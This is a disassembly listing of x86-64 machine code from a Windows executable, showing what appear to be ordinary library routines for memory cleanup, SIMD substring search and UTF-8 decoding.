   1400030b9:	48 8b 48 ff          	mov    -0x1(%rax),%rcx
   1400030bd:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   1400030c1:	48 8b 40 07          	mov    0x7(%rax),%rax
   1400030c5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400030c9:	48 8b 00             	mov    (%rax),%rax
   1400030cc:	48 85 c0             	test   %rax,%rax
   1400030cf:	74 06                	je     0x1400030d7
   1400030d1:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400030d5:	ff d0                	call   *%rax
   1400030d7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400030db:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400030df:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400030e3:	48 85 d2             	test   %rdx,%rdx
   1400030e6:	74 09                	je     0x1400030f1
   1400030e8:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400030ec:	e8 df ec ff ff       	call   0x140001dd0
   1400030f1:	ba 18 00 00 00       	mov    $0x18,%edx
   1400030f6:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400030fc:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140003100:	e8 cb ec ff ff       	call   0x140001dd0
   140003105:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003109:	48 8b 11             	mov    (%rcx),%rdx
   14000310c:	48 85 d2             	test   %rdx,%rdx
   14000310f:	74 14                	je     0x140003125
   140003111:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140003115:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000311b:	48 83 c4 50          	add    $0x50,%rsp
   14000311f:	5d                   	pop    %rbp
   140003120:	e9 ab ec ff ff       	jmp    0x140001dd0
   140003125:	90                   	nop
   140003126:	48 83 c4 50          	add    $0x50,%rsp
   14000312a:	5d                   	pop    %rbp
   14000312b:	c3                   	ret
   14000312c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003130:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003135:	55                   	push   %rbp
   140003136:	48 83 ec 20          	sub    $0x20,%rsp
   14000313a:	48 8d 6a 50          	lea    0x50(%rdx),%rbp
   14000313e:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003142:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140003146:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000314a:	48 85 d2             	test   %rdx,%rdx
   14000314d:	74 0d                	je     0x14000315c
   14000314f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140003153:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140003157:	e8 74 ec ff ff       	call   0x140001dd0
   14000315c:	ba 18 00 00 00       	mov    $0x18,%edx
   140003161:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003167:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   14000316b:	e8 60 ec ff ff       	call   0x140001dd0
   140003170:	90                   	nop
   140003171:	48 83 c4 20          	add    $0x20,%rsp
   140003175:	5d                   	pop    %rbp
   140003176:	c3                   	ret
   140003177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000317e:	00 00 
   140003180:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003185:	55                   	push   %rbp
   140003186:	48 83 ec 20          	sub    $0x20,%rsp
   14000318a:	48 8d 6a 50          	lea    0x50(%rdx),%rbp
   14000318e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003192:	48 8b 10             	mov    (%rax),%rdx
   140003195:	48 85 d2             	test   %rdx,%rdx
   140003198:	74 13                	je     0x1400031ad
   14000319a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000319e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400031a2:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400031a8:	e8 23 ec ff ff       	call   0x140001dd0
   1400031ad:	90                   	nop
   1400031ae:	48 83 c4 20          	add    $0x20,%rsp
   1400031b2:	5d                   	pop    %rbp
   1400031b3:	c3                   	ret
   1400031b4:	cc                   	int3
   1400031b5:	cc                   	int3
   1400031b6:	cc                   	int3
   1400031b7:	cc                   	int3
   1400031b8:	cc                   	int3
   1400031b9:	cc                   	int3
   1400031ba:	cc                   	int3
   1400031bb:	cc                   	int3
   1400031bc:	cc                   	int3
   1400031bd:	cc                   	int3
   1400031be:	cc                   	int3
   1400031bf:	cc                   	int3
   1400031c0:	55                   	push   %rbp
   1400031c1:	48 89 e5             	mov    %rsp,%rbp
   1400031c4:	31 c0                	xor    %eax,%eax
   1400031c6:	5d                   	pop    %rbp
   1400031c7:	c3                   	ret
   1400031c8:	cc                   	int3
   1400031c9:	cc                   	int3
   1400031ca:	cc                   	int3
   1400031cb:	cc                   	int3
   1400031cc:	cc                   	int3
   1400031cd:	cc                   	int3
   1400031ce:	cc                   	int3
   1400031cf:	cc                   	int3
   1400031d0:	55                   	push   %rbp
   1400031d1:	48 89 e5             	mov    %rsp,%rbp
   1400031d4:	48 8b 09             	mov    (%rcx),%rcx
   1400031d7:	5d                   	pop    %rbp
   1400031d8:	e9 13 44 01 00       	jmp    0x1400175f0
   1400031dd:	cc                   	int3
   1400031de:	cc                   	int3
   1400031df:	cc                   	int3
   1400031e0:	55                   	push   %rbp
   1400031e1:	48 89 e5             	mov    %rsp,%rbp
   1400031e4:	48 8b 01             	mov    (%rcx),%rax
   1400031e7:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400031eb:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   1400031ef:	48 89 c1             	mov    %rax,%rcx
   1400031f2:	5d                   	pop    %rbp
   1400031f3:	49 ff e0             	rex.WB jmp *%r8
   1400031f6:	cc                   	int3
   1400031f7:	cc                   	int3
   1400031f8:	cc                   	int3
   1400031f9:	cc                   	int3
   1400031fa:	cc                   	int3
   1400031fb:	cc                   	int3
   1400031fc:	cc                   	int3
   1400031fd:	cc                   	int3
   1400031fe:	cc                   	int3
   1400031ff:	cc                   	int3
   140003200:	55                   	push   %rbp
   140003201:	41 57                	push   %r15
   140003203:	41 56                	push   %r14
   140003205:	41 55                	push   %r13
   140003207:	41 54                	push   %r12
   140003209:	56                   	push   %rsi
   14000320a:	57                   	push   %rdi
   14000320b:	53                   	push   %rbx
   14000320c:	48 81 ec 38 01 00 00 	sub    $0x138,%rsp
   140003213:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000321a:	00 
   14000321b:	66 44 0f 7f ad a0 00 	movdqa %xmm13,0xa0(%rbp)
   140003222:	00 00 
   140003224:	66 44 0f 7f a5 90 00 	movdqa %xmm12,0x90(%rbp)
   14000322b:	00 00 
   14000322d:	66 44 0f 7f 9d 80 00 	movdqa %xmm11,0x80(%rbp)
   140003234:	00 00 
   140003236:	66 44 0f 7f 55 70    	movdqa %xmm10,0x70(%rbp)
   14000323c:	66 44 0f 7f 4d 60    	movdqa %xmm9,0x60(%rbp)
   140003242:	66 44 0f 7f 45 50    	movdqa %xmm8,0x50(%rbp)
   140003248:	66 0f 7f 7d 40       	movdqa %xmm7,0x40(%rbp)
   14000324d:	66 0f 7f 75 30       	movdqa %xmm6,0x30(%rbp)
   140003252:	4c 89 c3             	mov    %r8,%rbx
   140003255:	49 89 d6             	mov    %rdx,%r14
   140003258:	49 89 cc             	mov    %rcx,%r12
   14000325b:	4c 39 ca             	cmp    %r9,%rdx
   14000325e:	73 29                	jae    0x140003289
   140003260:	4c 89 cf             	mov    %r9,%rdi
   140003263:	41 0f b6 04 24       	movzbl (%r12),%eax
   140003268:	4d 8d 4e ff          	lea    -0x1(%r14),%r9
   14000326c:	49 83 fe 02          	cmp    $0x2,%r14
   140003270:	75 36                	jne    0x1400032a8
   140003272:	48 83 ff 11          	cmp    $0x11,%rdi
   140003276:	72 77                	jb     0x1400032ef
   140003278:	41 0f b6 4c 24 01    	movzbl 0x1(%r12),%ecx
   14000327e:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140003284:	e9 ad 00 00 00       	jmp    0x140003336
   140003289:	0f 85 a1 05 00 00    	jne    0x140003830
   14000328f:	4c 89 e1             	mov    %r12,%rcx
   140003292:	48 89 da             	mov    %rbx,%rdx
   140003295:	4d 89 f0             	mov    %r14,%r8
   140003298:	e8 00 76 01 00       	call   0x14001a89d
   14000329d:	85 c0                	test   %eax,%eax
   14000329f:	40 0f 94 c6          	sete   %sil
   1400032a3:	e9 8a 05 00 00       	jmp    0x140003832
   1400032a8:	31 d2                	xor    %edx,%edx
   1400032aa:	4c 89 f1             	mov    %r14,%rcx
   1400032ad:	48 83 e9 04          	sub    $0x4,%rcx
   1400032b1:	48 0f 43 d1          	cmovae %rcx,%rdx
   1400032b5:	4d 89 c8             	mov    %r9,%r8
   1400032b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400032bf:	00 
   1400032c0:	49 8d 48 01          	lea    0x1(%r8),%rcx
   1400032c4:	48 39 ca             	cmp    %rcx,%rdx
   1400032c7:	0f 83 18 02 00 00    	jae    0x1400034e5
   1400032cd:	4d 89 c7             	mov    %r8,%r15
   1400032d0:	4d 39 f0             	cmp    %r14,%r8
   1400032d3:	0f 83 5b 06 00 00    	jae    0x140003934
   1400032d9:	43 0f b6 0c 3c       	movzbl (%r12,%r15,1),%ecx
   1400032de:	4d 8d 47 ff          	lea    -0x1(%r15),%r8
   1400032e2:	38 c1                	cmp    %al,%cl
   1400032e4:	74 da                	je     0x1400032c0
   1400032e6:	49 8d 56 0f          	lea    0xf(%r14),%rdx
   1400032ea:	48 39 fa             	cmp    %rdi,%rdx
   1400032ed:	76 47                	jbe    0x140003336
   1400032ef:	48 89 d9             	mov    %rbx,%rcx
   1400032f2:	4c 89 e2             	mov    %r12,%rdx
   1400032f5:	4d 89 f0             	mov    %r14,%r8
   1400032f8:	e8 a0 75 01 00       	call   0x14001a89d
   1400032fd:	40 b6 01             	mov    $0x1,%sil
   140003300:	85 c0                	test   %eax,%eax
   140003302:	0f 84 2a 05 00 00    	je     0x140003832
   140003308:	48 ff c3             	inc    %rbx
   14000330b:	48 ff cf             	dec    %rdi
   14000330e:	66 90                	xchg   %ax,%ax
   140003310:	4c 39 f7             	cmp    %r14,%rdi
   140003313:	0f 82 17 05 00 00    	jb     0x140003830
   140003319:	48 89 d9             	mov    %rbx,%rcx
   14000331c:	4c 89 e2             	mov    %r12,%rdx
   14000331f:	4d 89 f0             	mov    %r14,%r8
   140003322:	e8 76 75 01 00       	call   0x14001a89d
   140003327:	48 ff c3             	inc    %rbx
   14000332a:	48 ff cf             	dec    %rdi
   14000332d:	85 c0                	test   %eax,%eax
   14000332f:	75 df                	jne    0x140003310
   140003331:	e9 fc 04 00 00       	jmp    0x140003832
   140003336:	0f b6 c0             	movzbl %al,%eax
   140003339:	66 0f 6e c0          	movd   %eax,%xmm0
   14000333d:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140003341:	f2 0f 70 c0 00       	pshuflw $0x0,%xmm0,%xmm0
   140003346:	66 0f 70 f0 00       	pshufd $0x0,%xmm0,%xmm6
   14000334b:	0f b6 c1             	movzbl %cl,%eax
   14000334e:	66 0f 6e c0          	movd   %eax,%xmm0
   140003352:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140003356:	f2 0f 70 c0 00       	pshuflw $0x0,%xmm0,%xmm0
   14000335b:	66 0f 70 f8 00       	pshufd $0x0,%xmm0,%xmm7
   140003360:	49 ff c4             	inc    %r12
   140003363:	48 89 5d b8          	mov    %rbx,-0x48(%rbp)
   140003367:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   14000336b:	4c 89 65 c8          	mov    %r12,-0x38(%rbp)
   14000336f:	4c 89 4d 20          	mov    %r9,0x20(%rbp)
   140003373:	4c 89 4d d0          	mov    %r9,-0x30(%rbp)
   140003377:	49 8d 4e 3f          	lea    0x3f(%r14),%rcx
   14000337b:	48 39 f9             	cmp    %rdi,%rcx
   14000337e:	0f 83 73 02 00 00    	jae    0x1400035f7
   140003384:	4d 8d 2c 1f          	lea    (%r15,%rbx,1),%r13
   140003388:	49 83 c5 30          	add    $0x30,%r13
   14000338c:	31 f6                	xor    %esi,%esi
   14000338e:	45 31 e4             	xor    %r12d,%r12d
   140003391:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   140003395:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000339c:	00 00 00 00 
   1400033a0:	40 f6 c6 01          	test   $0x1,%sil
   1400033a4:	0f 85 52 02 00 00    	jne    0x1400035fc
   1400033aa:	f3 42 0f 6f 04 23    	movdqu (%rbx,%r12,1),%xmm0
   1400033b0:	f3 46 0f 6f 64 23 10 	movdqu 0x10(%rbx,%r12,1),%xmm12
   1400033b7:	f3 46 0f 6f 54 23 20 	movdqu 0x20(%rbx,%r12,1),%xmm10
   1400033be:	f3 46 0f 6f 44 23 30 	movdqu 0x30(%rbx,%r12,1),%xmm8
   1400033c5:	66 0f 74 c6          	pcmpeqb %xmm6,%xmm0
   1400033c9:	f3 43 0f 6f 4c 25 d0 	movdqu -0x30(%r13,%r12,1),%xmm1
   1400033d0:	f3 47 0f 6f 6c 25 e0 	movdqu -0x20(%r13,%r12,1),%xmm13
   1400033d7:	f3 47 0f 6f 5c 25 f0 	movdqu -0x10(%r13,%r12,1),%xmm11
   1400033de:	f3 47 0f 6f 4c 25 00 	movdqu 0x0(%r13,%r12,1),%xmm9
   1400033e5:	66 0f 74 cf          	pcmpeqb %xmm7,%xmm1
   1400033e9:	66 0f db c8          	pand   %xmm0,%xmm1
   1400033ed:	66 44 0f d7 c1       	pmovmskb %xmm1,%r8d
   1400033f2:	45 85 c0             	test   %r8d,%r8d
   1400033f5:	75 68                	jne    0x14000345f
   1400033f7:	66 44 0f 74 e6       	pcmpeqb %xmm6,%xmm12
   1400033fc:	66 44 0f 74 ef       	pcmpeqb %xmm7,%xmm13
   140003401:	66 45 0f db ec       	pand   %xmm12,%xmm13
   140003406:	66 45 0f d7 c5       	pmovmskb %xmm13,%r8d
   14000340b:	66 45 85 c0          	test   %r8w,%r8w
   14000340f:	75 65                	jne    0x140003476
   140003411:	66 44 0f 74 d6       	pcmpeqb %xmm6,%xmm10
   140003416:	66 44 0f 74 df       	pcmpeqb %xmm7,%xmm11
   14000341b:	66 45 0f db da       	pand   %xmm10,%xmm11
   140003420:	66 45 0f d7 c3       	pmovmskb %xmm11,%r8d
   140003425:	66 45 85 c0          	test   %r8w,%r8w
   140003429:	75 70                	jne    0x14000349b
   14000342b:	66 44 0f 74 c6       	pcmpeqb %xmm6,%xmm8
   140003430:	66 44 0f 74 cf       	pcmpeqb %xmm7,%xmm9
   140003435:	66 45 0f db c8       	pand   %xmm8,%xmm9
   14000343a:	66 45 0f d7 c1       	pmovmskb %xmm9,%r8d
   14000343f:	66 45 85 c0          	test   %r8w,%r8w
   140003443:	75 7b                	jne    0x1400034c0
   140003445:	4a 8d 04 21          	lea    (%rcx,%r12,1),%rax
   140003449:	48 83 c0 40          	add    $0x40,%rax
   14000344d:	49 83 c4 40          	add    $0x40,%r12
   140003451:	48 39 f8             	cmp    %rdi,%rax
   140003454:	0f 82 46 ff ff ff    	jb     0x1400033a0
   14000345a:	e9 9d 01 00 00       	jmp    0x1400035fc
   14000345f:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140003463:	4c 89 e2             	mov    %r12,%rdx
   140003466:	45 31 c9             	xor    %r9d,%r9d
   140003469:	e8 22 75 01 00       	call   0x14001a990
   14000346e:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140003472:	89 c6                	mov    %eax,%esi
   140003474:	eb 81                	jmp    0x1400033f7
   140003476:	49 8d 54 24 10       	lea    0x10(%r12),%rdx
   14000347b:	41 89 f1             	mov    %esi,%r9d
   14000347e:	41 80 e1 01          	and    $0x1,%r9b
   140003482:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140003486:	e8 05 75 01 00       	call   0x14001a990
   14000348b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000348f:	40 08 f0             	or     %sil,%al
   140003492:	24 01                	and    $0x1,%al
   140003494:	89 c6                	mov    %eax,%esi
   140003496:	e9 76 ff ff ff       	jmp    0x140003411
   14000349b:	49 8d 54 24 20       	lea    0x20(%r12),%rdx
   1400034a0:	41 89 f1             	mov    %esi,%r9d
   1400034a3:	41 80 e1 01          	and    $0x1,%r9b
   1400034a7:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400034ab:	e8 e0 74 01 00       	call   0x14001a990
   1400034b0:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1400034b4:	40 08 f0             	or     %sil,%al
   1400034b7:	24 01                	and    $0x1,%al
   1400034b9:	89 c6                	mov    %eax,%esi
   1400034bb:	e9 6b ff ff ff       	jmp    0x14000342b
   1400034c0:	49 8d 54 24 30       	lea    0x30(%r12),%rdx
   1400034c5:	41 89 f1             	mov    %esi,%r9d
   1400034c8:	41 80 e1 01          	and    $0x1,%r9b
   1400034cc:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400034d0:	e8 bb 74 01 00       	call   0x14001a990
   1400034d5:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   1400034d9:	40 08 f0             	or     %sil,%al
   1400034dc:	24 01                	and    $0x1,%al
   1400034de:	89 c6                	mov    %eax,%esi
   1400034e0:	e9 60 ff ff ff       	jmp    0x140003445
   1400034e5:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400034ea:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400034ee:	48 89 da             	mov    %rbx,%rdx
   1400034f1:	49 89 f8             	mov    %rdi,%r8
   1400034f4:	4d 89 e1             	mov    %r12,%r9
   1400034f7:	e8 04 4d 01 00       	call   0x140018200
   1400034fc:	f6 45 b8 01          	testb  $0x1,-0x48(%rbp)
   140003500:	0f 84 cf 01 00 00    	je     0x1400036d5
   140003506:	48 8b 5d f0          	mov    -0x10(%rbp),%rbx
   14000350a:	4c 8b 45 00          	mov    0x0(%rbp),%r8
   14000350e:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140003512:	4c 8d 58 ff          	lea    -0x1(%rax),%r11
   140003516:	48 8b 55 08          	mov    0x8(%rbp),%rdx
   14000351a:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
   14000351e:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140003522:	0f 84 c3 02 00 00    	je     0x1400037eb
   140003528:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000352c:	4e 8d 0c 19          	lea    (%rcx,%r11,1),%r9
   140003530:	49 39 d1             	cmp    %rdx,%r9
   140003533:	0f 83 f7 02 00 00    	jae    0x140003830
   140003539:	4c 8b 75 d8          	mov    -0x28(%rbp),%r14
   14000353d:	4c 8b 7d c0          	mov    -0x40(%rbp),%r15
   140003541:	4c 8b 55 d0          	mov    -0x30(%rbp),%r10
   140003545:	48 89 c6             	mov    %rax,%rsi
   140003548:	4c 89 55 28          	mov    %r10,0x28(%rbp)
   14000354c:	4c 29 d6             	sub    %r10,%rsi
   14000354f:	48 89 75 20          	mov    %rsi,0x20(%rbp)
   140003553:	47 0f b6 0c 08       	movzbl (%r8,%r9,1),%r9d
   140003558:	4d 0f a3 ce          	bt     %r9,%r14
   14000355c:	73 3e                	jae    0x14000359c
   14000355e:	49 39 df             	cmp    %rbx,%r15
   140003561:	49 89 d9             	mov    %rbx,%r9
   140003564:	4d 0f 47 cf          	cmova  %r15,%r9
   140003568:	4d 8d 14 08          	lea    (%r8,%rcx,1),%r10
   14000356c:	4c 89 ce             	mov    %r9,%rsi
   14000356f:	90                   	nop
   140003570:	48 39 c6             	cmp    %rax,%rsi
   140003573:	73 3c                	jae    0x1400035b1
   140003575:	4c 8d 24 31          	lea    (%rcx,%rsi,1),%r12
   140003579:	49 39 d4             	cmp    %rdx,%r12
   14000357c:	0f 83 c4 03 00 00    	jae    0x140003946
   140003582:	4c 8d 66 01          	lea    0x1(%rsi),%r12
   140003586:	44 0f b6 2c 37       	movzbl (%rdi,%rsi,1),%r13d
   14000358b:	45 3a 2c 32          	cmp    (%r10,%rsi,1),%r13b
   14000358f:	4c 89 e6             	mov    %r12,%rsi
   140003592:	74 dc                	je     0x140003570
   140003594:	4c 29 f9             	sub    %r15,%rcx
   140003597:	4c 01 e1             	add    %r12,%rcx
   14000359a:	eb 03                	jmp    0x14000359f
   14000359c:	48 01 c1             	add    %rax,%rcx
   14000359f:	31 db                	xor    %ebx,%ebx
   1400035a1:	4e 8d 0c 19          	lea    (%rcx,%r11,1),%r9
   1400035a5:	31 f6                	xor    %esi,%esi
   1400035a7:	49 39 d1             	cmp    %rdx,%r9
   1400035aa:	72 a7                	jb     0x140003553
   1400035ac:	e9 81 02 00 00       	jmp    0x140003832
   1400035b1:	4d 89 fa             	mov    %r15,%r10
   1400035b4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400035bb:	00 00 00 00 00 
   1400035c0:	4c 39 d3             	cmp    %r10,%rbx
   1400035c3:	0f 83 1d 02 00 00    	jae    0x1400037e6
   1400035c9:	49 ff ca             	dec    %r10
   1400035cc:	49 39 c2             	cmp    %rax,%r10
   1400035cf:	0f 83 af 03 00 00    	jae    0x140003984
   1400035d5:	4d 8d 0c 0a          	lea    (%r10,%rcx,1),%r9
   1400035d9:	49 39 d1             	cmp    %rdx,%r9
   1400035dc:	0f 83 93 03 00 00    	jae    0x140003975
   1400035e2:	42 0f b6 34 17       	movzbl (%rdi,%r10,1),%esi
   1400035e7:	43 3a 34 08          	cmp    (%r8,%r9,1),%sil
   1400035eb:	74 d3                	je     0x1400035c0
   1400035ed:	48 03 4d 28          	add    0x28(%rbp),%rcx
   1400035f1:	48 8b 5d 20          	mov    0x20(%rbp),%rbx
   1400035f5:	eb aa                	jmp    0x1400035a1
   1400035f7:	31 f6                	xor    %esi,%esi
   1400035f9:	45 31 e4             	xor    %r12d,%r12d
   1400035fc:	4b 8d 04 34          	lea    (%r12,%r14,1),%rax
   140003600:	48 83 c0 0f          	add    $0xf,%rax
   140003604:	48 39 f8             	cmp    %rdi,%rax
   140003607:	73 77                	jae    0x140003680
   140003609:	49 83 c6 0f          	add    $0xf,%r14
   14000360d:	4e 8d 2c 3b          	lea    (%rbx,%r15,1),%r13
   140003611:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140003615:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000361c:	00 00 00 00 
   140003620:	40 f6 c6 01          	test   $0x1,%sil
   140003624:	75 5a                	jne    0x140003680
   140003626:	f3 42 0f 6f 04 23    	movdqu (%rbx,%r12,1),%xmm0
   14000362c:	f3 43 0f 6f 4c 25 00 	movdqu 0x0(%r13,%r12,1),%xmm1
   140003633:	66 0f 74 c6          	pcmpeqb %xmm6,%xmm0
   140003637:	66 0f 74 cf          	pcmpeqb %xmm7,%xmm1
   14000363b:	66 0f db c8          	pand   %xmm0,%xmm1
   14000363f:	66 44 0f d7 c1       	pmovmskb %xmm1,%r8d
   140003644:	45 85 c0             	test   %r8d,%r8d
   140003647:	75 13                	jne    0x14000365c
   140003649:	4b 8d 04 26          	lea    (%r14,%r12,1),%rax
   14000364d:	48 83 c0 10          	add    $0x10,%rax
   140003651:	49 83 c4 10          	add    $0x10,%r12
   140003655:	48 39 f8             	cmp    %rdi,%rax
   140003658:	72 c6                	jb     0x140003620
   14000365a:	eb 24                	jmp    0x140003680
   14000365c:	48 89 ce             	mov    %rcx,%rsi
   14000365f:	4c 89 e2             	mov    %r12,%rdx
   140003662:	45 31 c9             	xor    %r9d,%r9d
   140003665:	e8 26 73 01 00       	call   0x14001a990
   14000366a:	48 89 f1             	mov    %rsi,%rcx
   14000366d:	89 c6                	mov    %eax,%esi
   14000366f:	4b 8d 04 26          	lea    (%r14,%r12,1),%rax
   140003673:	48 83 c0 10          	add    $0x10,%rax
   140003677:	49 83 c4 10          	add    $0x10,%r12
   14000367b:	48 39 f8             	cmp    %rdi,%rax
   14000367e:	72 a0                	jb     0x140003620
   140003680:	48 2b 7d 20          	sub    0x20(%rbp),%rdi
   140003684:	48 8d 04 3b          	lea    (%rbx,%rdi,1),%rax
   140003688:	48 83 c0 f0          	add    $0xfffffffffffffff0,%rax
   14000368c:	f3 0f 6f 44 3b f0    	movdqu -0x10(%rbx,%rdi,1),%xmm0
   140003692:	f3 41 0f 6f 0c 07    	movdqu (%r15,%rax,1),%xmm1
   140003698:	66 0f 74 c6          	pcmpeqb %xmm6,%xmm0
   14000369c:	66 0f 74 cf          	pcmpeqb %xmm7,%xmm1
   1400036a0:	66 0f db c8          	pand   %xmm0,%xmm1
   1400036a4:	66 44 0f d7 c1       	pmovmskb %xmm1,%r8d
   1400036a9:	45 85 c0             	test   %r8d,%r8d
   1400036ac:	0f 84 80 01 00 00    	je     0x140003832
   1400036b2:	48 83 c7 f0          	add    $0xfffffffffffffff0,%rdi
   1400036b6:	41 89 f1             	mov    %esi,%r9d
   1400036b9:	41 80 e1 01          	and    $0x1,%r9b
   1400036bd:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   1400036c1:	48 89 fa             	mov    %rdi,%rdx
   1400036c4:	e8 c7 72 01 00       	call   0x14001a990
   1400036c9:	40 08 f0             	or     %sil,%al
   1400036cc:	24 01                	and    $0x1,%al
   1400036ce:	89 c6                	mov    %eax,%esi
   1400036d0:	e9 5d 01 00 00       	jmp    0x140003832
   1400036d5:	80 7d d2 00          	cmpb   $0x0,-0x2e(%rbp)
   1400036d9:	0f 85 51 01 00 00    	jne    0x140003830
   1400036df:	4c 8b 45 c0          	mov    -0x40(%rbp),%r8
   1400036e3:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
   1400036e7:	48 8b 55 08          	mov    0x8(%rbp),%rdx
   1400036eb:	0f b6 75 d0          	movzbl -0x30(%rbp),%esi
   1400036ef:	eb 16                	jmp    0x140003707
   1400036f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400036f8:	0f 1f 84 00 00 00 00 
   1400036ff:	00 
   140003700:	40 80 f6 01          	xor    $0x1,%sil
   140003704:	4d 01 c8             	add    %r9,%r8
   140003707:	4d 85 c0             	test   %r8,%r8
   14000370a:	74 17                	je     0x140003723
   14000370c:	49 39 d0             	cmp    %rdx,%r8
   14000370f:	73 0c                	jae    0x14000371d
   140003711:	42 80 3c 01 bf       	cmpb   $0xbf,(%rcx,%r8,1)
   140003716:	7f 0b                	jg     0x140003723
   140003718:	e9 79 02 00 00       	jmp    0x140003996
   14000371d:	0f 85 73 02 00 00    	jne    0x140003996
   140003723:	49 39 d0             	cmp    %rdx,%r8
   140003726:	0f 84 ff 01 00 00    	je     0x14000392b
   14000372c:	46 0f b6 14 01       	movzbl (%rcx,%r8,1),%r10d
   140003731:	41 0f b6 c2          	movzbl %r10b,%eax
   140003735:	84 c0                	test   %al,%al
   140003737:	78 35                	js     0x14000376e
   140003739:	40 f6 c6 01          	test   $0x1,%sil
   14000373d:	0f 85 a3 00 00 00    	jne    0x1400037e6
   140003743:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003749:	3d 80 00 00 00       	cmp    $0x80,%eax
   14000374e:	72 b0                	jb     0x140003700
   140003750:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140003756:	3d 00 08 00 00       	cmp    $0x800,%eax
   14000375b:	72 a3                	jb     0x140003700
   14000375d:	3d 00 00 01 00       	cmp    $0x10000,%eax
   140003762:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003768:	49 83 d9 00          	sbb    $0x0,%r9
   14000376c:	eb 92                	jmp    0x140003700
   14000376e:	41 89 c1             	mov    %eax,%r9d
   140003771:	41 83 e1 1f          	and    $0x1f,%r9d
   140003775:	46 0f b6 5c 01 01    	movzbl 0x1(%rcx,%r8,1),%r11d
   14000377b:	41 83 e3 3f          	and    $0x3f,%r11d
   14000377f:	3c df                	cmp    $0xdf,%al
   140003781:	76 3c                	jbe    0x1400037bf
   140003783:	42 0f b6 44 01 02    	movzbl 0x2(%rcx,%r8,1),%eax
   140003789:	41 c1 e3 06          	shl    $0x6,%r11d
   14000378d:	83 e0 3f             	and    $0x3f,%eax
   140003790:	44 09 d8             	or     %r11d,%eax
   140003793:	41 80 fa f0          	cmp    $0xf0,%r10b
   140003797:	72 3c                	jb     0x1400037d5
   140003799:	46 0f b6 54 01 03    	movzbl 0x3(%rcx,%r8,1),%r10d
   14000379f:	41 83 e1 07          	and    $0x7,%r9d
   1400037a3:	41 c1 e1 12          	shl    $0x12,%r9d
   1400037a7:	c1 e0 06             	shl    $0x6,%eax
   1400037aa:	41 83 e2 3f          	and    $0x3f,%r10d
   1400037ae:	41 09 c2             	or     %eax,%r10d
   1400037b1:	45 09 ca             	or     %r9d,%r10d
   1400037b4:	44 89 d0             	mov    %r10d,%eax
   1400037b7:	40 f6 c6 01          	test   $0x1,%sil
   1400037bb:	74 86                	je     0x140003743
   1400037bd:	eb 27                	jmp    0x1400037e6
   1400037bf:	41 c1 e1 06          	shl    $0x6,%r9d
   1400037c3:	45 09 d9             	or     %r11d,%r9d
   1400037c6:	44 89 c8             	mov    %r9d,%eax
   1400037c9:	40 f6 c6 01          	test   $0x1,%sil
   1400037cd:	0f 84 70 ff ff ff    	je     0x140003743
   1400037d3:	eb 11                	jmp    0x1400037e6
   1400037d5:	41 c1 e1 0c          	shl    $0xc,%r9d
   1400037d9:	44 09 c8             	or     %r9d,%eax
   1400037dc:	40 f6 c6 01          	test   $0x1,%sil
